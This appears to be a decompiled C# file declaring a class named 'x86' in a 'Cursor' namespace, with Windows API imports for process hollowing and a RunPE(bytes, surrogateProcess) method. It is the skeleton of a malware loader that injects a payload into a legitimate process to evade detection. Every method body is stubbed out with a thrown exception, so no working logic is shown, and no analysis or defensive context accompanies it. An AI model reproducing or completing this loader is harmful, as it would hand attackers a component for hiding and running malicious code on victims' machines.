using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

namespace Cursor;

public class x86
{
	[SuppressUnmanagedCodeSecurity]
	private class Win32
	{
		[DebuggerNonUserCode]
		public Win32()
		{
			throw new ApplicationException();
		}

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool CreateProcess(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool GetThreadContext(IntPtr hThr, uint[] ctxt);

		[DllImport("ntdll")]
		public static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool ReadProcessMemory(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, IntPtr bufrSize, ref IntPtr numRead);

		[DllImport("kernel32")]
		public static extern int ResumeThread(IntPtr hThr);

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool SetThreadContext(IntPtr hThr, uint[] ctxt);

		[DllImport("kernel32")]
		public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool VirtualProtectEx(IntPtr hProc, IntPtr addr, IntPtr size, int newProt, ref int oldProt);

		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buff, IntPtr size, ref IntPtr numRead);
	}

	private static readonly int[] prot;

	static x86()
	{
		throw new ApplicationException();
	}

	[DebuggerNonUserCode]
	public x86()
	{
		throw new ApplicationException();
	}

	public static void RunPE(byte[] bytes, string surrogateProcess)
	{
		throw new ApplicationException();
	}
}
